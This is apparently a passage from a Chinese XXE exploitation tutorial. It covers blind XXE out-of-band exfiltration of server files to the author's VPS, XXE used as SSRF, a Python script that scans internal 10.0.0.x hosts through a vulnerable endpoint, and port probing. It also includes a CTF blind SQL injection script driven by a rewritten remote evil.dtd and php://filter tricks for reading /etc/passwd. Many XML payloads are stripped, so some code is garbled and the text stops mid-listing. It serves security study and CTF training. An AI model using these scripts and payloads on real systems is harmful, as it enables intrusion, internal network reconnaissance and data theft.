我发现上面这段代码由于解析的问题将 send 前面的 HTML 实体转化成了 %
,虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码
**payload：**
    %remote;%int;%send;
    ]>
**结果如下：**
我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。
**整个调用过程：**
我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote
先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file,
%file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码
`&#37;`)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE
无回显的问题。
### **新的思考：**
我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF
的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如
192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF
其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。
### **新的利用：**
所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议
**如图所示:**
PHP在安装扩展以后还能支持的协议：
**如图所示：**
> **注意：**
>
> 1.其中从2012年9月开始，Oracle JDK版本中删除了对gopher方案的支持，后来又支持的版本是 Oracle JDK 1.7  
>  update 7 和 Oracle JDK 1.6 update 35  
>  2.libxml 是 PHP 的 xml 支持
### **实验三：HTTP 内网主机探测**
我们以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file
协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（我以linux 为例），我们可以尝试读取
/etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了
**下面是一个探测脚本的实例：**
    import requests
    import base64
    #Origtional XML that the server accepts
    #
    #    user
    #
    def build_xml(string):
        xml = """"""
        xml = xml + "\r\n" + """"""
        xml = xml + "\r\n" + """]>"""
        xml = xml + "\r\n" + """"""
        xml = xml + "\r\n" + """    &xxe;"""
        xml = xml + "\r\n" + """"""
        send_xml(xml)
    def send_xml(xml):
        headers = {'Content-Type': 'application/xml'}
        x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text
        coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value
        print coded_string
    #   print base64.b64decode(coded_string)
    for i in range(1, 255):
        try:
            i = str(i)
            ip = '10.0.0.' + i
            string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/'
            print string
            build_xml(string)
        except:
    continue
**返回结果：**
### **实验四：HTTP 内网主机端口扫描**
找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip
地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的，读者可以自行修改一下，当然除了这种方法，我们还能结合
burpsuite 进行端口探测
**比如我们传入：**
    ]>
    4
**返回结果：**
    javax.xml.bind.UnmarshalException  
     - with linked exception:
    [Exception [EclipseLink-25004] (Eclipse Persistence Services): org.eclipse.persistence.exceptions.XMLMarshalException
    Exception Description: An error occurred unmarshalling the document  
    Internal Exception: ████████████████████████: Connection refused
这样就完成了一次端口探测。如果想更多，我们可以将请求的端口作为 参数 然后利用 bp 的 intruder 来帮我们探测
**如下图所示：**
至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用
XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的
比如 strus2）
### **实验五：内网盲注(CTF)**
2018 强网杯 有一道题就是利用 XXE 漏洞进行内网的 SQL 盲注的,大致的思路如下：
首先在外网的一台ip地址为 39.107.33.75:33899 的评论框处测试发现 XXE 漏洞，我们输入 xml 以及 dtd 会出现报错
**如图所示：**
既然如此，那么我们是不是能读取该服务器上面的文件，我们先读配置文件(这个点是 Blind XXE ，必须使用参数实体，外部引用 DTD )
    /var/www/52dandan.cc/public_html/config.php
拿到第一部分 flag
> **注意：**
>
> 这里有一个小技巧，当我们使用 libxml 读取文件内容的时候，文件不能过大，如果太大就会报错，于是我们就需要使用 php  
>  过滤器的一个压缩的方法  
>  
>  压缩：echo
> file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");  
>  解压：echo
> file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");
然后我们考虑内网有没有东西，我们读取
    /proc/net/arp
    /etc/host
找到内网的另一台服务器的 ip 地址 192.168.223.18
拿到这个 ip 我们考虑就要使用 XXE 进行端口扫描了，然后我们发现开放了 80 端口，然后我们再进行目录扫描，找到一个 test.php
，根据提示，这个页面的 shop 参数存在一个注入,但是因为本身这个就是一个 Blind XXE ,我们的对服务器的请求都是在我们的远程 DTD
中包含的，现在我们需要改变我们的请求，那我们就要在每一次修改请求的时候修改我们远程服务器的 DTD 文件，于是我们的脚本就要挂在我们的 VPS
上，一边边修改 DTD 一边向存在 XXE 漏洞的主机发送请求，脚本就像下面这个样子
**示例代码：**
    import requests
    url = 'http://39.107.33.75:33899/common.php'
    s = requests.Session()
    result = ''
    data = {
            "name":"evil_man",
            "email":"PI:EMAIL",
            "comment":"""
                    %dtd;]>
                    """
    }
    for i in range(0,28):
            for j in range(48,123):
                    f = open('./evil.dtd','w')
                payload2 = """
                    ">
                    %all;
                    %send;""".format('_'*i+chr(j)+'_'*(27-i))
                    f.write(payload2)
                    f.close()
                    print 'test {}'.format(chr(j))
                    r = s.post(url,data=data)
                    if "Oti3a3LeLPdkPkqKF84xs=" in r.content and chr(j)!='_':
                            result += chr(j)
                            print chr(j)
                            break
    print result
这道题难度比加大，做起来也非常的耗时，所有的东西都要靠脚本去猜，因此当时是0解
### **实验六：文件上传**
我们之前说的好像都是 php 相关，但是实际上现实中很多都是 java 的框架出现的 XXE 漏洞，通过阅读文档，我发现 Java 中有一个比较神奇的协议
jar:// ， php 中的 phar:// 似乎就是为了实现 jar:// 的类似的功能设计出来的。
**jar:// 协议的格式：**
    jar:{url}!{path}
**实例：**
    jar:http://host/application.jar!/file/within/the/zip
    这个 ! 后面就是其需要从中解压出的文件
jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等，这个功能似乎比 phar 强大啊，phar:// 是没法远程加载文件的（因此
phar:// 一般用于绕过文件上传，在一些2016年的HCTF中考察过这个知识点，我也曾在校赛中出过类似的题目，奥，2018年的 blackhat 讲述的
phar:// 的反序列化很有趣，Orange 曾在2017年的 hitcon 中出过这道题）
**jar 协议处理文件的过程：**
(1) 下载 jar/zip 文件到临时文件中  
(2) 提取出我们指定的文件  
(3) 删除临时文件
> **那么我们怎么找到我们下载的临时文件呢？**
>
> 因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用
下面是我的一些测试过程：
我首先在本地模拟一个存在 XXE 的程序，网上找的能直接解析 XML 文件的 java 源码
**示例代码：**
**xml_test.java**
    package xml_test;
    import java.io.File;
    import javax.xml.parsers.DocumentBuilder;
    import javax.xml.parsers.DocumentBuilderFactory;
    import org.w3c.dom.Attr;
    import org.w3c.dom.Comment;
    import org.w3c.dom.Document;
    import org.w3c.dom.Element;
    import org.w3c.dom.NamedNodeMap;
    import org.w3c.dom.Node;
    import org.w3c.dom.NodeList;
    /**
     * 使用递归解析给定的任意一个xml文档并且将其内容输出到命令行上
     * @author zhanglong
     *
     */
    public class xml_test
    {
        public static void main(String[] args) throws Exception